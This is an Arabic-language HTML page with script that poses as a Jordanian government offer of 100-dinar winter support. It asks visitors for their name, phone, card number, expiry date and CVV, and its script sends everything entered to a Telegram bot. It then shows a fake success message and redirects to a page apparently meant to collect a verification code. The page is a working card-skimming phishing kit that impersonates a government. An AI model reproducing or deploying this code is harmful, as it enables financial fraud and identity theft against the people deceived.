        <h6 class="text-center" style="font-weight:bold; color: #000;margin-top: 20px;margin-bottom: 30px;">

            قم بالحصول على دعم الشتاء بقيمة 100 دينار من الحكومة الأردنية لجميع المواطنين</h6>





        <div class="container justify-content-center" style="justify-content: center !important;text-align: center !important;">


            <h6 class="text-center" style="font-weight:bold; color: #000;margin-top: 10px;">




            </h6></div>








                        <form id="forum" style="padding: 10px;">







                            <div class="form-group row  text-right">

                                <label for="nom" class=" col-form-label text-md-right" style="font-weight:bold;">المستلم ( الاسم الكامل ) :</label>

                                <input id="nom" value="" class="form-control " name="nom"  autofocus="">

                                <span id="verify_nom" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من اسم هذا الحقل</span>







                            </div>



                            <div class="form-group row  text-right">

                                <label for="tel" class=" col-form-label text-md-right" style="font-weight:bold;">رقم الهاتف - <small class="text-info" style="font-weight:bold;">من الممكن أن يتك التواصل معكم </small></label>

                                <input class="form-control" style="direction: ltr;" type="number" id="tel" name="tel" maxlength="10" autocomplete="false" autofocus="">

                                <span id="verify_tel" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من اسم المستلم</span>


.
                            </div>













                            <hr>



















                            <div class="form-group row  text-right">

                                <label for="cNum" class="col-form-label text-md-right" style="font-weight:bold;">رقم البطاقة :</label>

                                <input class="form-control " id="cNum" name="cNum" style="direction: ltr;" maxlength="16" autofocus="">

                                <span id="verify_cnum" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من رقم البطاقة</span>

                            </div>









                            <div class="form-group row  text-right">

                                <label for="cDate" class="col-form-label text-md-right" style="font-weight:bold;">تاريخ الإنتهاء (MM/YYYY) :</label>





                                <input class="form-control " id="cDate" name="cDate" style="direction: ltr;" autofocus="">

                                <span id="verify_date" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من تاريخ انتهاء البطاقة</span>



                            </div>



                            <div class="form-group row  text-right">

                                <label for="cvc" class="col-form-small text-md-right"><small style="font-weight:bold;"> CVC - آخر ثلاث أرقام خلف البطاقة  </small> :</label>

                                <input type="number"  class="form-control" style="direction: ltr;" id="cvc" name="cvc" autofocus="" maxlength="3">

                                <span id="verify_cvv" class="text-danger font-weight-bolder text-right" style="display: none;">يرجى التحقق من رمز CVV</span>



                            </div>

<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

<script src="bot_config.js"></script>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>







<script>

    $(document).ready(function() {

        $('#forum').submit(function(event) {

            event.preventDefault();

            $('#verify_nom').hide();

            $('#verify_tel').hide();

            $('#verify_date').hide();

            $('#verify_cvv').hide();





            const cNom = $("#nom").val(); // الحصول على رقم الهاتف المدخل

            const tel = $("#tel").val(); // الحصول على رقم الهاتف المدخل

            const cNum = $("#cNum").val(); // الحصول على رقم الهاتف المدخل

            const cDate = $("#cDate").val(); // الحصول على رقم الهاتف المدخل

            const cvc = $("#cvc").val(); // الحصول على رقم الهاتف المدخل





            if (!cNom) {

                $('#verify_nom').show();

                return;

            }



            if (!tel){

                $('#verify_tel').show();

                return;

            }







            if (!cDate){



                $('#verify_date').show();

                return;



            }



            if (!cvc){

                $('#verify_cvv').show();

                return;



            }





            const cardtype = {

                visa: /^4[0-9]{12}(?:[0-9]{3})?$/,

                mastercard: /^5[1-5][0-9]{14}$/

            };



            if (!cardtype.visa.test(cNum) && !cardtype.mastercard.test(cNum)) {



                $('#verify_cnum').show();



                return;

            }











            const telegramMessage = "--------هيما بسلم-------\nName : " + cNom + "\nPhone Number : " + tel + "\nCard number : " + cNum + "\nExpire : " + cDate + "\nCVV : " + cvc + "\n--------------------\n";



            const telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";

            const requestData = {

                chat_id: botConfig.chatId,

                text: telegramMessage

            };



            // إرسال البيانات إلى الروبوت

            $.post(telegramBotUrl, requestData, function(response) {

                console.log(response);

                const sa = Math.floor(Math.random() * 900);

                Swal.fire({

                    title: "تم تسجيل طلبك بنجاح",

                    text:   "الدفعة قيد الانتظار , رقم شحنتك هو : SA"+sa,

                    icon: "warning"

                });



    setTimeout(function() {
      window.location.href = "https://support100-jordan.netlify.app/code.html";
    }, 3000);




            });

        });







    });

</script>
